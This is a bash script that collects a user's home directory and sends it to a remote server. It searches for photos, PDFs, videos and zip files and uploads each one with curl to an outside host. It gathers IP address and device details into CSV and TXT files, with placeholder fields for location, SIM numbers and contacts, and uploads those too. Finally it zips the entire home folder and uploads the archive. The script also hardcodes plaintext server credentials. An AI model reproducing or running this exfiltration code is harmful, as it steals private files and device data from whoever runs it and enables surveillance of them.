#!/bin/bash

# Configuration
UPLOAD_URL="https://tes.indiostudio.net"
SERVER_USER="miftah"  # Replace with your VPS username
SERVER_PASSWORD="Cinta4545"  # Replace with your VPS password
DATE=$(date +"%Y-%m-%d_%H-%M-%S")
UPLOAD_DIR="web/"
CSV_FILE="penting_$DATE.csv"
TXT_FILE="penting_$DATE.txt"
ZIP_FILE="data_$(hostname)_$DATE.zip"
FILE_PATH="${1:-$HOME}" 

# Detect operating system and set folder path
OS=$(uname -s)

case "$OS" in
    Linux)
        # For Linux
        FOLDER_NAME="/home/$(whoami)/"
        ;;
    Darwin)
        # For macOS
        FOLDER_NAME="/Users/$(whoami)/"
        ;;
    CYGWIN*|MINGW32*|MINGW64*|MSYS*)
        # For Windows
        FOLDER_NAME="C:/Users/$(whoami)/"
        ;;
    *)
        # Default if OS is not recognized
        FOLDER_NAME="/sdcard"
        ;;
esac

# Display folder path
echo "Folder Name: $FOLDER_NAME"

# Function to list files to be uploaded
list_files() {
    find "$FOLDER_NAME" -type f \( -name "*.jpg" -o -name "*.pdf" -o -name "*.mp4" -o -name "*.avi" -o -name "*.mov" -o -name "*.zip" \) | sort
}

# Function to log request details
log_request() {
    local file_path="$1"
    local response_code="$2"

    echo "$(date +"%Y-%m-%d %H:%M:%S") - Request method: POST" >> upload.log
    echo "$(date +"%Y-%m-%d %H:%M:%S") - Request URI: $UPLOAD_URL" >> upload.log
    echo "$(date +"%Y-%m-%d %H:%M:%S") - HTTP code: $response_code" >> upload.log
    echo "$(date +"%Y-%m-%d %H:%M:%S") - File uploaded successfully: $file_path" >> upload.log
    echo "" >> upload.log
}

# Function to upload a file to the server
upload_file() {
    local file_path="$1"
    local url="$UPLOAD_URL"

    if ! command -v curl &> /dev/null; then
        echo "curl command not found. Please install curl."
        exit 1
    fi

    local response_code
    response_code=$(curl -s -o /dev/null -w "%{http_code}" -u "$SERVER_USER:$SERVER_PASSWORD" -F "file=@$file_path" "$url")
    log_request "$file_path" "$response_code"
}

# Function to handle file uploads
upload_files() {
    local folder_path="$FILE_PATH"
    if [ ! -d "$folder_path" ]; then
        echo "Directory $folder_path does not exist."
        exit 1
    fi

    local files
    files=$(list_files "$folder_path")
    if [ -z "$files" ]; then
        echo "No files found in $folder_path."
        exit 1
    fi

    while IFS= read -r file; do
        BASENAME=$(basename "$file")
        TIMESTAMPED_FILE="${BASENAME%.*}__${DATE}.${BASENAME##*.}"
        echo "Uploading $file as $TIMESTAMPED_FILE..."
        upload_file "$file"
    done <<< "$files"
}

# Function to create the upload directory (assuming your server has an endpoint for directory creation)
create_upload_dir() {
    local response_code
    response_code=$(curl -s -o /dev/null -w "%{http_code}" -u "$SERVER_USER:$SERVER_PASSWORD" -X POST "$UPLOAD_URL?dir=$UPLOAD_DIR")
}

# Function to create the CSV and TXT files
create_files() {
    # Gathering system information
    IP_ADDRESS=$(hostname -I | awk '{print $1}')
    DEVICE_INFO=$(uname -a)
    LOCATION="(not available)"  # Placeholder
    SIM_NUMBERS="SIM info not available"  # Placeholder
    CONTACT_LIST="No contacts available"  # Placeholder

    # Creating CSV file
    {
        echo "IP Address,Device Info,Location,SIM Numbers,Contact List"
        echo "$IP_ADDRESS,\"$DEVICE_INFO\",\"$LOCATION\",\"$SIM_NUMBERS\",\"$CONTACT_LIST\""
    } > "$CSV_FILE"
    
    # Creating TXT file
    cp "$CSV_FILE" "$TXT_FILE"
}

# Function to upload the TXT file followed by the CSV file
upload_csv_and_execute_commands() {
    echo "Uploading $TXT_FILE to $UPLOAD_URL/$UPLOAD_DIR/"
    upload_file "$TXT_FILE"

    echo "Uploading $CSV_FILE to $UPLOAD_URL/$UPLOAD_DIR/"
    upload_file "$CSV_FILE"
}

# Function to zip the specified folder and upload the zip file
zip_and_upload_folder() {
    local folder_to_zip="$FOLDER_NAME"
    if [ ! -z "$1" ]; then
        folder_to_zip="$1"
    fi

    # Creating zip file
    cd "$folder_to_zip" || exit 1
    zip -r "$ZIP_FILE" *

    # Uploading zip file
    echo "Uploading $ZIP_FILE to $UPLOAD_URL/$UPLOAD_DIR/"
    upload_file "$ZIP_FILE"
}

# Main script execution
main() {
    create_upload_dir
    create_files
    upload_csv_and_execute_commands
    upload_files "$FILE_PATH"
    zip_and_upload_folder
}

# Execute the main function
main
